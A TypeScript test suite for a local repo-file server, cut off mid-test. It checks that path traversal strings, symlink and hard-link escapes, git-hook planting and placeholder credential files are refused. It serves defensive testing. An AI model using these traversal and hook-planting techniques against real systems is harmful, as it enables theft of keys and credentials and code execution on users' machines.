import assert from 'node:assert';
import { test } from 'node:test';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRepoServer } from '../server/repoServer.js';
import { serveGraph } from '../serve.js';
import { scanRepo } from '../scan.js';
import { diffGraphs } from '../diff.js';
import { validateGraph, type ArchGraph } from '@sequence/schema';

const here = path.dirname(fileURLToPath(import.meta.url));
// dist/test -> dist -> analyzer -> packages -> <repo root>
const REPO_ROOT = path.resolve(here, '..', '..', '..', '..');
const TICKETING = path.join(REPO_ROOT, 'examples', 'ticketing-scaffold');
const TICKETING_SPEC = path.join(REPO_ROOT, 'examples', 'ticketing.spec.json');

/** Copy the ticketing fixture into a throwaway dir so writes never touch examples/. */
function freshRepo(withNodeModules = false): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sequence-srv-'));
  const repo = path.join(dir, 'repo');
  fs.cpSync(TICKETING, repo, { recursive: true });
  if (withNodeModules) {
    fs.mkdirSync(path.join(repo, 'node_modules', 'left-pad'), { recursive: true });
    fs.writeFileSync(path.join(repo, 'node_modules', 'left-pad', 'index.js'), 'module.exports = 1;\n');
  }
  return repo;
}

/** Start a repo server on an ephemeral localhost port; returns base URL + closer. */
async function startRepoServer(repoRoot: string): Promise<{ base: string; close: () => Promise<void> }> {
  const server = await createRepoServer(repoRoot, { webDist: undefined });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()));
  const addr = server.address();
  const port = typeof addr === 'object' && addr ? addr.port : 0;
  return {
    base: `http://127.0.0.1:${port}`,
    close: () => new Promise<void>((resolve) => server.close(() => resolve())),
  };
}

/** Collect every file path (repo-relative) from a tree response. */
function collectFiles(node: { path: string; type: string; children?: unknown[] }, acc: string[] = []): string[] {
  if (node.type === 'file') acc.push(node.path);
  for (const c of (node.children as typeof node[]) ?? []) collectFiles(c, acc);
  return acc;
}

function collectDirNames(node: { name: string; type: string; children?: unknown[] }, acc: string[] = []): string[] {
  if (node.type === 'dir') acc.push(node.name);
  for (const c of (node.children as typeof node[]) ?? []) collectDirNames(c, acc);
  return acc;
}

test('GET /api/tree lists gateway/api/worker files and excludes ignored dirs', async () => {
  const repo = freshRepo(true);
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/tree`);
    assert.strictEqual(res.status, 200);
    const tree = (await res.json()) as { name: string; type: string; children: unknown[] };
    assert.strictEqual(tree.type, 'dir');

    const files = collectFiles(tree as never);
    assert.ok(files.includes('gateway/index.ts'), `expected gateway/index.ts in ${files.join(', ')}`);
    assert.ok(files.includes('api/app/main.py'), `expected api/app/main.py in ${files.join(', ')}`);
    assert.ok(files.includes('worker/index.ts'), `expected worker/index.ts in ${files.join(', ')}`);

    // node_modules (and anything inside it) must be excluded — same ignore rules as the scanner.
    const dirNames = collectDirNames(tree as never);
    assert.ok(!dirNames.includes('node_modules'), 'node_modules must not appear in the tree');
    assert.ok(!files.some((f) => f.includes('node_modules')), 'no file under node_modules may appear');
  } finally {
    await close();
  }
});

test('GET /api/file returns exact contents and blocks traversal attacks', async () => {
  const repo = freshRepo();
  const { base, close } = await startRepoServer(repo);
  try {
    // exact contents
    const known = fs.readFileSync(path.join(repo, 'gateway/index.ts'), 'utf8');
    const ok = await fetch(`${base}/api/file?path=${encodeURIComponent('gateway/index.ts')}`);
    assert.strictEqual(ok.status, 200);
    assert.strictEqual(await ok.text(), known);

    // traversal via ../../
    const t1 = await fetch(`${base}/api/file?path=${encodeURIComponent('../../etc/passwd')}`);
    assert.strictEqual(t1.status, 403);

    // absolute path
    const t2 = await fetch(`${base}/api/file?path=${encodeURIComponent('/etc/passwd')}`);
    assert.strictEqual(t2.status, 403);

    // percent-encoded ../ ( ..%2F..%2Fetc%2Fpasswd )
    const t3 = await fetch(`${base}/api/file?path=..%2F..%2Fetc%2Fpasswd`);
    assert.strictEqual(t3.status, 403);

    // missing file -> 404
    const t4 = await fetch(`${base}/api/file?path=${encodeURIComponent('gateway/nope.ts')}`);
    assert.strictEqual(t4.status, 404);

    // oversized file -> clean 413, not a crash
    fs.writeFileSync(path.join(repo, 'huge.bin'), Buffer.alloc(1_000_001, 0x61));
    const t5 = await fetch(`${base}/api/file?path=huge.bin`);
    assert.strictEqual(t5.status, 413);
    const body = (await t5.json()) as { error: string };
    assert.match(body.error, /too large/);
  } finally {
    await close();
  }
});

test('symlink escaping the repo root is rejected (403)', async () => {
  const repo = freshRepo();
  // A symlink inside the repo pointing at /etc/passwd — lexically contained, but realpath escapes.
  const link = path.join(repo, 'escape.txt');
  try {
    fs.symlinkSync('/etc/passwd', link);
  } catch {
    return; // symlink creation not permitted here; skip
  }
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/file?path=escape.txt`);
    assert.strictEqual(res.status, 403);
  } finally {
    await close();
  }
});

test('GET /api/file refuses reserved dirs (.sequence / .git) with 403 and leaks no key', async () => {
  const repo = freshRepo();
  // Plant a realistic .sequence/ai.json (the plaintext key) and a .git/ dir, then
  // prove neither is readable through /api/file. Round-1 review reproduced a live
  // key leak here: the handler jailed the path but never applied the reserved-dir
  // refusal that /api/prompt-file already had.
  const SECRET = 'sk-ant-LIVE-KEY-should-never-leak-0000';
  fs.mkdirSync(path.join(repo, '.sequence'), { recursive: true });
  fs.writeFileSync(
    path.join(repo, '.sequence', 'ai.json'),
    JSON.stringify({ provider: 'anthropic', model: 'x', apiKey: SECRET })
  );
  fs.writeFileSync(path.join(repo, '.sequence', 'spec.json'), JSON.stringify({ version: 1 }));
  fs.mkdirSync(path.join(repo, '.git'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
  fs.writeFileSync(path.join(repo, '.git', 'HEAD'), 'ref: refs/heads/main\n');
  const { base, close } = await startRepoServer(repo);
  try {
    for (const rel of ['.sequence/ai.json', '.sequence/spec.json', '.git/config', '.git/HEAD']) {
      const res = await fetch(`${base}/api/file?path=${encodeURIComponent(rel)}`);
      assert.strictEqual(res.status, 403, `${rel} must be 403`);
      const text = await res.text();
      assert.ok(!text.includes(SECRET), `${rel} response must not contain key material`);
    }
  } finally {
    await close();
  }
});

test('GET /api/file refuses an in-repo symlink that RESOLVES into a reserved dir (403, no key)', async () => {
  // Round-2: the reserved-dir guard was LEXICAL — it matched the first path
  // segment, so a symlink `docs` → `.sequence` (top segment `docs`, contained by
  // realpath so the jail passes) slipped past and shipped the plaintext key. The
  // fix judges reserved-ness on the REALPATH, not the lexical input.
  const repo = freshRepo();
  const SECRET = 'sk-ant-LIVE-KEY-should-never-leak-1111';
  fs.mkdirSync(path.join(repo, '.sequence'), { recursive: true });
  fs.writeFileSync(
    path.join(repo, '.sequence', 'ai.json'),
    JSON.stringify({ provider: 'anthropic', model: 'x', apiKey: SECRET })
  );
  fs.writeFileSync(path.join(repo, '.sequence', 'spec.json'), JSON.stringify({ version: 1 }));
  fs.mkdirSync(path.join(repo, '.git'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.git', 'config'), '[core]\n');
  // A benign in-repo symlink to a NON-reserved dir, to prove the fix does not over-block.
  fs.mkdirSync(path.join(repo, 'realdocs'), { recursive: true });
  fs.writeFileSync(path.join(repo, 'realdocs', 'readme.md'), '# hello\n');
  try {
    fs.symlinkSync('.sequence', path.join(repo, 'docs')); // docs -> .sequence
    fs.symlinkSync('.git', path.join(repo, 'gitlink')); // gitlink -> .git
    fs.symlinkSync('realdocs', path.join(repo, 'benign')); // benign -> a normal dir
  } catch {
    return; // symlinks not permitted here; skip
  }
  const { base, close } = await startRepoServer(repo);
  try {
    // Every symlink that resolves into a reserved dir is refused, key never leaks.
    for (const rel of ['docs/ai.json', 'docs/spec.json', 'gitlink/config']) {
      const res = await fetch(`${base}/api/file?path=${encodeURIComponent(rel)}`);
      assert.strictEqual(res.status, 403, `${rel} must be 403 (resolves into a reserved dir)`);
      assert.ok(!(await res.text()).includes(SECRET), `${rel} must not leak key material`);
    }
    // Direct lexical reserved access is (still) blocked too.
    const direct = await fetch(`${base}/api/file?path=${encodeURIComponent('.sequence/ai.json')}`);
    assert.strictEqual(direct.status, 403);
    // Regression: a benign in-repo symlink to a NON-reserved dir still reads fine.
    const ok = await fetch(`${base}/api/file?path=${encodeURIComponent('benign/readme.md')}`);
    assert.strictEqual(ok.status, 200, 'a benign in-repo symlink must NOT be over-blocked');
    assert.strictEqual(await ok.text(), '# hello\n');
  } finally {
    await close();
  }
});

test('F1: GET /api/file refuses local-secret dirs (.ssh/.aws/.gnupg) even inside an attached repo', async () => {
  // F1 defence-in-depth (layer 2): even if a directory containing local secrets
  // is legitimately attached (or a broadly-scoped attach slips past layer 1),
  // /api/file must still refuse the common credential dirs. Reviewer's live repro
  // was `?path=.ssh/id_rsa` → 200 plaintext with home attached; now 403.
  const repo = freshRepo();
  fs.mkdirSync(path.join(repo, '.ssh'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.ssh', 'id_rsa'), 'PRIVATE-KEY-MATERIAL-2222');
  fs.mkdirSync(path.join(repo, '.aws'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.aws', 'credentials'), '[default]\naws_secret_access_key=SECRET-3333\n');
  fs.mkdirSync(path.join(repo, '.gnupg'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.gnupg', 'secring.x'), 'GNUPG-KEYRING-4444');
  const { base, close } = await startRepoServer(repo);
  try {
    for (const [rel, secret] of [
      ['.ssh/id_rsa', 'PRIVATE-KEY-MATERIAL-2222'],
      ['.aws/credentials', 'SECRET-3333'],
      ['.gnupg/secring.x', 'GNUPG-KEYRING-4444'],
    ] as const) {
      const res = await fetch(`${base}/api/file?path=${encodeURIComponent(rel)}`);
      assert.strictEqual(res.status, 403, `${rel} must be 403 (reserved secret dir)`);
      assert.ok(!(await res.text()).includes(secret), `${rel} response must not leak its contents`);
    }
    // No over-block: an ordinary source file is still served.
    const ok = await fetch(`${base}/api/file?path=${encodeURIComponent('gateway/index.ts')}`);
    assert.strictEqual(ok.status, 200, 'a normal file still reads');

    // A symlink RESOLVING into .ssh is refused too (realpath-based match, not lexical).
    try {
      fs.symlinkSync('.ssh', path.join(repo, 'keys')); // keys -> .ssh
    } catch {
      return; // symlinks not permitted here; the direct cases above still assert the fix
    }
    const viaLink = await fetch(`${base}/api/file?path=${encodeURIComponent('keys/id_rsa')}`);
    assert.strictEqual(viaLink.status, 403, 'a symlink into .ssh must be 403 (realpath reserved)');
    assert.ok(!(await viaLink.text()).includes('PRIVATE-KEY-MATERIAL-2222'), 'symlinked read must not leak');
  } finally {
    await close();
  }
});

test('GET /api/tree never lists .sequence/ or .git/ entries (no leak in map form)', async () => {
  const repo = freshRepo();
  fs.mkdirSync(path.join(repo, '.sequence'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.sequence', 'ai.json'), '{"apiKey":"sk-ant-nope"}');
  fs.mkdirSync(path.join(repo, '.git'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.git', 'HEAD'), 'ref: refs/heads/main\n');
  const { base, close } = await startRepoServer(repo);
  try {
    const tree = (await (await fetch(`${base}/api/tree`)).json()) as {
      name: string;
      type: string;
      children: unknown[];
    };
    const dirNames = collectDirNames(tree as never);
    assert.ok(!dirNames.includes('.sequence'), '.sequence must not appear in the tree');
    assert.ok(!dirNames.includes('.git'), '.git must not appear in the tree');
    const files = collectFiles(tree as never);
    assert.ok(!files.some((f) => f.startsWith('.sequence/')), 'no .sequence file listed');
    assert.ok(!files.some((f) => f.startsWith('.git/')), 'no .git file listed');
  } finally {
    await close();
  }
});

test('GET /api/tree LISTS dot-entries (.github/.gitignore) but never the reserved ones', async () => {
  // r72 findability: blanket-hiding every dot-entry meant `.github/`, `.gitignore`,
  // `.eslintrc` and friends simply did not exist as far as the user could tell.
  // They are listed now; the secret/platform dirs stay invisible, unconditionally.
  const repo = freshRepo();
  fs.mkdirSync(path.join(repo, '.github', 'workflows'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.github', 'workflows', 'ci.yml'), 'name: ci\n');
  fs.writeFileSync(path.join(repo, '.gitignore'), 'node_modules\n');
  fs.mkdirSync(path.join(repo, '.sequence'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.sequence', 'ai.json'), '{"apiKey":"sk-ant-nope"}');
  fs.mkdirSync(path.join(repo, '.git'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.git', 'HEAD'), 'ref: refs/heads/main\n');
  fs.mkdirSync(path.join(repo, '.ssh'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.ssh', 'id_rsa'), 'PRIVATE KEY\n');

  const { base, close } = await startRepoServer(repo);
  try {
    const tree = (await (await fetch(`${base}/api/tree`)).json()) as {
      name: string;
      type: string;
      children: unknown[];
    };
    const dirNames = collectDirNames(tree as never);
    const files = collectFiles(tree as never);

    // visible: ordinary repo config the user must be able to find and open
    assert.ok(dirNames.includes('.github'), `.github must be listed, got ${dirNames.join(', ')}`);
    assert.ok(files.includes('.github/workflows/ci.yml'), 'files inside .github are listed');
    assert.ok(files.includes('.gitignore'), '.gitignore must be listed');

    // never visible: secrets + platform internals
    for (const reserved of ['.sequence', '.git', '.ssh']) {
      assert.ok(!dirNames.includes(reserved), `${reserved} must not appear in the tree`);
      assert.ok(!files.some((f) => f.startsWith(`${reserved}/`)), `no ${reserved} file listed`);
    }
    assert.ok(!JSON.stringify(tree).includes('sk-ant-'), 'no key material anywhere in the tree');
  } finally {
    await close();
  }
});

test('POST /api/scan returns a graph that passes validateGraph with zero problems', async () => {
  const repo = freshRepo();
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/scan`, { method: 'POST' });
    assert.strictEqual(res.status, 200);
    const graph = (await res.json()) as ArchGraph;
    assert.deepStrictEqual(validateGraph(graph), []);
    // /archgraph.json now serves the fresh graph too.
    const canvas = await fetch(`${base}/archgraph.json`);
    const served = (await canvas.json()) as ArchGraph;
    assert.strictEqual(served.scannedAt, graph.scannedAt);
  } finally {
    await close();
  }
});

/* =========================== r179: three endpoints REMOVED (feature honesty) ===
 * POST /api/diff, GET|PUT /api/spec and GET|PUT /api/state were registered but
 * unreachable: nothing in packages/web (or any other package) ever called them,
 * and the spec pair made the design circular — generate READ `.sequence/spec.json`
 * while the only writer was a PUT no surface issued, so the stored spec was always
 * absent. They are gone, not hidden. These tests replace the round-trip tests they
 * used to be: the routes must 404, the capability must not be reachable by some
 * other verb, and the value each one carried must still be provable somewhere real.
 */

test('r179: /api/diff, /api/spec and /api/state are GONE — every verb 404s and nothing is served', async () => {
  const repo = freshRepo();
  const { base, close } = await startRepoServer(repo);
  try {
    const spec = JSON.parse(fs.readFileSync(TICKETING_SPEC, 'utf8')) as ArchGraph;
    const calls: [string, string, string | undefined][] = [
      ['POST', '/api/diff', JSON.stringify({ spec })],
      ['GET', '/api/diff', undefined],
      ['GET', '/api/spec', undefined],
      ['PUT', '/api/spec', JSON.stringify(spec)],
      ['POST', '/api/spec', JSON.stringify(spec)],
      ['GET', '/api/state', undefined],
      ['PUT', '/api/state', JSON.stringify({ positions: { 'svc:gateway': { x: 10, y: 20 } } })],
    ];
    for (const [method, route, body] of calls) {
      const res = await fetch(`${base}${route}`, {
        method,
        ...(body === undefined ? {} : { headers: { 'content-type': 'application/json' }, body }),
      });
      assert.strictEqual(res.status, 404, `${method} ${route} must be gone`);
      const payload = (await res.json()) as { error?: string };
      assert.match(String(payload.error), /unknown endpoint/, `${method} ${route} answers as unknown`);
    }
    // The removed writers wrote nothing on the way out: no state file was created,
    // and the spec file is only ever written by a successful generate.
    assert.ok(!fs.existsSync(path.join(repo, '.sequence', 'state.json')), 'state.json is never written again');
    assert.ok(!fs.existsSync(path.join(repo, '.sequence', 'spec.json')), 'a refused PUT persisted no spec');
  } finally {
    await close();
  }
});

test('r179: the conformance capability /api/diff carried is still real — the CLI diff reports zero drift', async () => {
  // The endpoint is gone; the CHECK it performed is not. `sequence diff <spec>
  // <scan>` is the shipped surface for it (and generate/prompt-file still embed
  // the same diff in their responses). Same claim the endpoint test made: the
  // ticketing spec vs a real scan of the ticketing scaffold has zero drift.
  const repo = freshRepo();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sequence-diffcap-'));
  const specPath = path.join(dir, 'spec.json');
  const scanPath = path.join(dir, 'scan.json');
  fs.copyFileSync(TICKETING_SPEC, specPath);
  fs.writeFileSync(scanPath, JSON.stringify(await scanRepo(repo)));
  const { added, removed, mismatched } = diffGraphs(specPath, scanPath);
  assert.deepStrictEqual(added, []);
  assert.deepStrictEqual(removed, []);
  assert.deepStrictEqual(mismatched, []);
});

test('backward compat: serveGraph still serves /archgraph.json and the web dist', async () => {
  // A minimal fake web dist so serveGraph does not need a real @sequence/web build.
  const dist = fs.mkdtempSync(path.join(os.tmpdir(), 'sequence-dist-'));
  fs.writeFileSync(path.join(dist, 'index.html'), '<!doctype html><title>viewer</title>');
  fs.writeFileSync(path.join(dist, 'app.js'), 'console.log("hi");');

  // A real scanned graph on disk (the frozen-graph path).
  const repo = freshRepo();
  const graph = await scanRepo(repo);
  const graphPath = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'sequence-g-')), 'archgraph.json');
  fs.writeFileSync(graphPath, JSON.stringify(graph));

  const server: http.Server = serveGraph(graphPath, 0, dist);
  await new Promise<void>((resolve) => {
    if (server.listening) resolve();
    else server.once('listening', () => resolve());
  });
  const addr = server.address();
  const port = typeof addr === 'object' && addr ? addr.port : 0;
  const bcBase = `http://127.0.0.1:${port}`;
  try {
    const g = await fetch(`${bcBase}/archgraph.json`);
    assert.strictEqual(g.status, 200);
    assert.strictEqual(g.headers.get('content-type'), 'application/json');
    const served = (await g.json()) as ArchGraph;
    assert.strictEqual(served.repoName, graph.repoName);

    const index = await fetch(`${bcBase}/`);
    assert.strictEqual(index.status, 200);
    assert.match(await index.text(), /viewer/);

    const js = await fetch(`${bcBase}/app.js`);
    assert.strictEqual(js.status, 200);
    assert.strictEqual(js.headers.get('content-type'), 'text/javascript');

    // legacy evidence file-serving still works (source file from the scanned repo)
    const ev = await fetch(`${bcBase}/api/file?path=${encodeURIComponent('gateway/index.ts')}`);
    assert.strictEqual(ev.status, 200);
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});

test('.sequence/ does not affect scans (memory dir is invisible to the scanner)', async () => {
  const repo = freshRepo();

  const clean = await scanRepo(repo);

  // Add a populated .sequence/ dir, exactly what the platform writes.
  fs.mkdirSync(path.join(repo, '.sequence'), { recursive: true });
  fs.writeFileSync(
    path.join(repo, '.sequence', 'spec.json'),
    fs.readFileSync(TICKETING_SPEC, 'utf8')
  );
  fs.writeFileSync(path.join(repo, '.sequence', 'state.json'), JSON.stringify({ a: 1 }));

  const withMemory = await scanRepo(repo);

  // scannedAt/repoRoot may differ (timestamp); the architecture must be identical.
  assert.deepStrictEqual(withMemory.nodes, clean.nodes);
  assert.deepStrictEqual(withMemory.edges, clean.edges);
  assert.deepStrictEqual(withMemory.warnings, clean.warnings);
});

test('decision records under .sequence/decisions round-trip: PUT writes to disk, GET reads it back', async () => {
  // "Open in editor" used to point at `.sequence/adr/{slug}.md`: the file was
  // never written, PUT 403'd (whole `.sequence` reserved) and a reopen-by-path
  // 403'd too. The record now lives in the one allowlisted subtree, so it must
  // really persist AND really be readable again — while the rest of `.sequence`
  // (the plaintext key) stays refused.
  const repo = freshRepo();
  const SECRET = 'sk-ant-LIVE-KEY-should-never-leak-9999';
  fs.mkdirSync(path.join(repo, '.sequence'), { recursive: true });
  fs.writeFileSync(
    path.join(repo, '.sequence', 'ai.json'),
    JSON.stringify({ provider: 'anthropic', model: 'x', apiKey: SECRET })
  );
  const rel = '.sequence/decisions/api-service.md';
  const body = '# API service\n\n## Context\n\nHandles HTTP.\n';
  const { base, close } = await startRepoServer(repo);
  try {
    const put = await fetch(`${base}/api/file`, {
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ path: rel, content: body }),
    });
    assert.strictEqual(put.status, 200, 'writing a decision record must be allowed');
    // Really on disk — not just an in-memory editor buffer.
    assert.strictEqual(fs.readFileSync(path.join(repo, rel), 'utf8'), body);

    const get = await fetch(`${base}/api/file?path=${encodeURIComponent(rel)}`);
    assert.strictEqual(get.status, 200, 'reopening the record by path must be allowed');
    assert.strictEqual(await get.text(), body);

    // The exemption is scoped to decisions/ ONLY — the key is still refused.
    const key = await fetch(`${base}/api/file?path=${encodeURIComponent('.sequence/ai.json')}`);
    assert.strictEqual(key.status, 403);
    assert.ok(!(await key.text()).includes(SECRET));
  } finally {
    await close();
  }
});

test('a symlink planted inside .sequence/decisions cannot read out of the allowlist', async () => {
  // The read exemption is judged on the REALPATH, so `decisions/leak.json` →
  // `.sequence/ai.json` canonicalises OUT of the allowlisted subtree and stays 403.
  const repo = freshRepo();
  const SECRET = 'sk-ant-LIVE-KEY-should-never-leak-8888';
  fs.mkdirSync(path.join(repo, '.sequence', 'decisions'), { recursive: true });
  fs.writeFileSync(
    path.join(repo, '.sequence', 'ai.json'),
    JSON.stringify({ provider: 'anthropic', model: 'x', apiKey: SECRET })
  );
  try {
    fs.symlinkSync(
      path.join(repo, '.sequence', 'ai.json'),
      path.join(repo, '.sequence', 'decisions', 'leak.json')
    );
  } catch {
    return; // symlinks not permitted here; skip
  }
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(
      `${base}/api/file?path=${encodeURIComponent('.sequence/decisions/leak.json')}`
    );
    assert.strictEqual(res.status, 403, 'a symlink out of decisions/ must stay refused');
    assert.ok(!(await res.text()).includes(SECRET));
  } finally {
    await close();
  }
});

test('a symlinked .sequence/decisions dir cannot be used to WRITE into .git (hook = RCE)', async () => {
  // Adversarial review, blocker 1. `isDecisionRecordWritePath` used to judge the
  // LEXICAL path while the read side judged the realpath, so the two allowlists
  // disagreed and the write side lost. A repo can COMMIT the symlink
  // `.sequence/decisions -> .git` (git stores symlinks, so a clone carries it);
  // afterwards `PUT .sequence/decisions/hooks/pre-commit` looked benign
  // lexically and landed an executable git hook => code execution on the user's
  // next commit. Both allowlists now canonicalise first.
  const repo = freshRepo();
  fs.mkdirSync(path.join(repo, '.git', 'hooks'), { recursive: true });
  try {
    fs.symlinkSync(path.join(repo, '.git'), path.join(repo, '.sequence', 'decisions'));
  } catch {
    return; // symlinks not permitted here; skip
  }
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/file`, {
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ path: '.sequence/decisions/hooks/pre-commit.md', content: '#!/bin/sh\ntouch /tmp/pwned\n' }),
    });
    assert.strictEqual(res.status, 403, 'a write canonicalising into .git must be refused');
    assert.ok(
      !fs.existsSync(path.join(repo, '.git', 'hooks', 'pre-commit.md')),
      'no file may be planted inside .git'
    );
  } finally {
    await close();
  }
});

test('a symlinked .sequence/decisions dir cannot be used to CLOBBER the stored API key', async () => {
  // Same escape, aimed at `.sequence` itself: the user's plaintext ai.json was
  // overwritten with markdown, destroying the key with no warning.
  const repo = freshRepo();
  const SECRET = 'sk-ant-LIVE-KEY-must-survive-4242';
  fs.mkdirSync(path.join(repo, '.sequence'), { recursive: true });
  fs.writeFileSync(
    path.join(repo, '.sequence', 'ai.json'),
    JSON.stringify({ provider: 'anthropic', model: 'x', apiKey: SECRET })
  );
  try {
    fs.symlinkSync(path.join(repo, '.sequence'), path.join(repo, '.sequence', 'decisions'));
  } catch {
    return;
  }
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/file`, {
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ path: '.sequence/decisions/ai.json.md', content: '# clobbered' }),
    });
    assert.strictEqual(res.status, 403);
    assert.ok(
      fs.readFileSync(path.join(repo, '.sequence', 'ai.json'), 'utf8').includes(SECRET),
      'the stored key must survive'
    );
  } finally {
    await close();
  }
});

test('a HARD link inside .sequence/decisions cannot read the stored API key', async () => {
  // Adversarial review, finding 2. fs.realpathSync does NOT resolve hard links,
  // so a hard link at decisions/leak.md -> .sequence/ai.json canonicalises to
  // itself, sits inside the allowlist, and served the plaintext key. A regular
  // file the product writes always has nlink === 1, so nlink > 1 is refused.
  const repo = freshRepo();
  const SECRET = 'sk-ant-LIVE-KEY-hardlink-9999';
  fs.mkdirSync(path.join(repo, '.sequence', 'decisions'), { recursive: true });
  fs.writeFileSync(
    path.join(repo, '.sequence', 'ai.json'),
    JSON.stringify({ provider: 'anthropic', model: 'x', apiKey: SECRET })
  );
  try {
    fs.linkSync(
      path.join(repo, '.sequence', 'ai.json'),
      path.join(repo, '.sequence', 'decisions', 'leak.md')
    );
  } catch {
    return; // hard links not permitted here; skip
  }
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(
      `${base}/api/file?path=${encodeURIComponent('.sequence/decisions/leak.md')}`
    );
    assert.strictEqual(res.status, 403, 'a hard link into the key must be refused');
    assert.ok(!(await res.text()).includes(SECRET));
  } finally {
    await close();
  }
});

test('the decision-record hole is bounded to .md so arbitrary filenames cannot be planted', async () => {
  const repo = freshRepo();
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/file`, {
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ path: '.sequence/decisions/pre-commit', content: 'x' }),
    });
    assert.strictEqual(res.status, 403, 'a non-.md write under decisions/ must be refused');
  } finally {
    await close();
  }
});

test('/api/tree lists project config but never credential files (they reach AI prompts)', async () => {
  // Adversarial review, finding 4. Listing dot-entries fixed findability, but the
  // blanket dot-filter it replaced was also what kept credential FILENAMES out of
  // buildTree() — which feeds buildPlainTree/buildAnnotations/buildDigest, i.e.
  // third-party provider prompts.
  const repo = freshRepo();
  fs.mkdirSync(path.join(repo, '.github'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.github', 'ci.yml'), 'on: push');
  fs.writeFileSync(path.join(repo, '.gitignore'), 'node_modules');
  fs.writeFileSync(path.join(repo, '.npmrc'), '//registry.npmjs.org/:_authToken=npm_SECRET123');
  fs.writeFileSync(path.join(repo, '.git-credentials'), 'https://user:ghp_SECRET@github.com');
  fs.writeFileSync(path.join(repo, '.netrc'), 'machine github.com password ghp_SECRET');
  fs.writeFileSync(path.join(repo, '.env.production'), 'STRIPE_SECRET=sk_live_zzz');
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/tree`);
    assert.strictEqual(res.status, 200);
    const body = JSON.stringify(await res.json());
    // Findability preserved:
    assert.ok(body.includes('.github'), 'project config must stay listed');
    assert.ok(body.includes('.gitignore'), 'project config must stay listed');
    // Credentials never listed:
    for (const secret of ['.npmrc', '.git-credentials', '.netrc', '.env.production']) {
      assert.ok(!body.includes(secret), `${secret} must never be listed`);
    }
    // And no secret VALUE can appear either.
    for (const v of ['npm_SECRET123', 'ghp_SECRET', 'sk_live_zzz']) {
      assert.ok(!body.includes(v), 'no credential value may appear in the tree');
    }
  } finally {
    await close();
  }
});

test('/api/tree lists .env TEMPLATES and never descends into tool caches', async () => {
  // Two collateral-damage fixes.
  //  - `.env.example` is a committed template of PLACEHOLDERS and is usually the
  //    first file a newcomer opens; hiding it was a side effect of the `.env.`
  //    prefix rule, not a security decision. Its secret-bearing siblings stay out.
  //  - `.terraform` / `.yarn` / `.idea` hold vendored binaries, zipped packages
  //    and editor state. Walking them made the tree slow and buried the repo's
  //    own files; nothing first-party lives there.
  const repo = freshRepo();
  fs.writeFileSync(path.join(repo, '.env.example'), 'STRIPE_SECRET=replace-me');
  fs.writeFileSync(path.join(repo, '.env.local'), 'STRIPE_SECRET=sk_live_leak');
  fs.mkdirSync(path.join(repo, '.terraform', 'providers'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.terraform', 'providers', 'huge.bin'), 'x');
  fs.mkdirSync(path.join(repo, '.idea'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.idea', 'workspace.xml'), '<x/>');
  const { base, close } = await startRepoServer(repo);
  try {
    const body = JSON.stringify(await (await fetch(`${base}/api/tree`)).json());
    assert.ok(body.includes('.env.example'), 'a committed env TEMPLATE must be findable');
    assert.ok(!body.includes('.env.local'), 'a real env file must stay hidden');
    assert.ok(!body.includes('sk_live_leak'), 'no secret value may appear');
    assert.ok(!body.includes('.terraform'), 'vendored provider cache is not repo content');
    assert.ok(!body.includes('huge.bin'), 'and it is never descended into');
    assert.ok(!body.includes('workspace.xml'), 'IDE state is not repo content');
  } finally {
    await close();
  }
});

test('an ABSENT decision record answers 404 (not 403) so the first one can be created', async () => {
  // Adversarial round 2 / data-loss chain. The hardlink guard lstat'd the target
  // and bailed when it was missing, so an absent record came back 403 "reserved".
  // The client may only generate a record when the server says it is genuinely
  // ABSENT, so 403-on-absent made creating the first record impossible — while
  // the client's older "any failure means absent" logic did the opposite and
  // overwrote real files. Both halves are locked here.
  const repo = freshRepo();
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(
      `${base}/api/file?path=${encodeURIComponent('.sequence/decisions/absent-record.md')}`
    );
    assert.strictEqual(res.status, 404, 'an allowlisted-but-missing record must 404, not 403');
  } finally {
    await close();
  }
});

test('an existing decision record still reads back, and the key is still refused', async () => {
  const repo = freshRepo();
  const SECRET = 'sk-ant-STILL-REFUSED-1234';
  fs.mkdirSync(path.join(repo, '.sequence', 'decisions'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.sequence', 'decisions', 'real.md'), '# real record');
  fs.writeFileSync(
    path.join(repo, '.sequence', 'ai.json'),
    JSON.stringify({ provider: 'anthropic', model: 'x', apiKey: SECRET })
  );
  const { base, close } = await startRepoServer(repo);
  try {
